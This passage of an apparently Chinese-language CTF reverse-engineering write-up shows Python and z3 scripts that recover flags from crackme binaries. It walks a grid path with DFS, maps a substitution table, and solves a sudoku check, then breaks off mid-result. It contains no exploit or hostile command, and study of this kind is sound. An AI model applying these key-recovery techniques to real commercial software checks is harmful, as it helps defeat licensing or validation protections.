class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params">theMap, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> theMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isAllClear</span>(<span class="hljs-params">theMap</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(theMap) == <span class="hljs-number">90</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genNextValid</span>(<span class="hljs-params">theMap, x, y</span>):</span><br>    insList = []<br>    <span class="hljs-comment"># case1</span><br>    <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y):<br>        insList.append((<span class="hljs-number">1</span>, x + <span class="hljs-number">1</span>, y))<br><br>    <span class="hljs-comment"># case4</span><br>    <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y):<br>        insList.append((<span class="hljs-number">4</span>, x - <span class="hljs-number">1</span>, y))<br><br>    <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># case2</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">2</span>, x + <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># default</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>):<br>            insList.append((-<span class="hljs-number">1</span>, x + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case3</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">3</span>, x, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case5</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y - <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">5</span>, x, y - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># case2</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">2</span>, x, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># default</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y - <span class="hljs-number">1</span>):<br>            insList.append((-<span class="hljs-number">1</span>, x, y - <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case3</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">3</span>, x - <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case5</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">5</span>, x - <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> insList<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">CurMap, curX, curY, InsList</span>):</span><br>    CurMap = CurMap.copy()<br>    CurMap[curY * <span class="hljs-number">10</span> + curX] = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> isAllClear(CurMap):<br>        print(<span class="hljs-string">&quot;Find Solve.&quot;</span>)<br>        print(InsList)<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            line = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">if</span> CurMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span>:<br>                    line = line + <span class="hljs-string">&quot;.&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    line = line + <span class="hljs-string">&quot;#&quot;</span><br>            print(line)<br>        <span class="hljs-keyword">return</span> InsList<br><br><br>    curInsList = genNextValid(CurMap, curX, curY)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(curInsList) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    result = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> curInsList:<br>        InsList.append(i)<br>        dfs(CurMap, i[<span class="hljs-number">1</span>], i[<span class="hljs-number">2</span>], InsList)<br>        InsList.pop()<br>    <span class="hljs-keyword">return</span> result<br><br><br>dfs(map1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, [])<br><br><span class="hljs-comment"># alpha = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># i_1 =&gt; alpha.index(flag[flagPos])</span><br><span class="hljs-comment"># v8 = i_1 + flagPos;</span><br><span class="hljs-comment"># v10 = 5 - v8 % 6;</span><br>alpha = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>target = [(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>)]<br>flagPos = <span class="hljs-number">0</span><br>realPos = <span class="hljs-number">0</span><br>v7 = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(target), <span class="hljs-number">2</span>):<br>    step1 = target[i][<span class="hljs-number">0</span>]<br>    step2 = target[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br>    flagPos = i // <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">if</span> step1 == -<span class="hljs-number">1</span>:<br>        step1 = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> step2 == -<span class="hljs-number">1</span>:<br>        step2 = <span class="hljs-number">0</span><br><br>    FindAns = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(alpha)):<br>        v7 = (flagPos + idx // <span class="hljs-number">6</span>) % <span class="hljs-number">6</span><br>        v6 = <span class="hljs-number">5</span> - (idx + flagPos) % <span class="hljs-number">6</span><br>        <span class="hljs-keyword">if</span> v6 == step1 <span class="hljs-keyword">and</span> v7 == step2:<br>            FindAns = idx<br><br>    flag += alpha[FindAns]<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="第四题-英雄救美"><a href="#第四题-英雄救美" class="headerlink" title="第四题 英雄救美"></a>第四题 英雄救美</h2><p>sub_391240 对输入数据进行转换<br>这个函数有点小坑…..</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">table1 = [<span class="hljs-number">0x24</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x71</span>]<br></code></pre></td></tr></table></figure><p>$B$BP =&gt; 12123</p><p>sub_391000  9x9 数独 check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">map1 = [<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000000</span>]<br><br>mat = []<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    line = <span class="hljs-built_in">list</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        line.append(map1[y * <span class="hljs-number">9</span> + x])<br>    mat.append(line)<br></code></pre></td></tr></table></figure><p>数独输出如下</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">9 </span><span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">8 </span><span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">9</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-number">0</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>用 z3 脚本解一下数独</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">X = [ [ Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i+<span class="hljs-number">1</span>, j+<span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ] <br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>cells_c  = [ And(<span class="hljs-number">1</span> &lt;= X[i][j], X[i][j] &lt;= <span class="hljs-number">9</span>) <br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>rows_c   = [ Distinct(X[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>cols_c   = [ Distinct([ X[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]) <br>             <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>sq_c     = [ Distinct([ X[<span class="hljs-number">3</span>*i0 + i][<span class="hljs-number">3</span>*j0 + j] <br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]) <br>             <span class="hljs-keyword">for</span> i0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]<br><br>sudoku_c = cells_c + rows_c + cols_c + sq_c<br><br>instance = [[<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>],<br> [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>],<br> [<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>],<br> [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>]]<br><br>instance_c = [ If(instance[i][j] == <span class="hljs-number">0</span>, <br>                  <span class="hljs-literal">True</span>, <br>                  X[i][j] == instance[i][j]) <br>               <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br><br>s = Solver()<br>s.add(sudoku_c + instance_c)<br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    r = [ [ m.evaluate(X[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ] <br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) ]<br>    print_matrix(r)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;failed to solve&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">result = [[<span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>],<br> [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>],<br> [<span 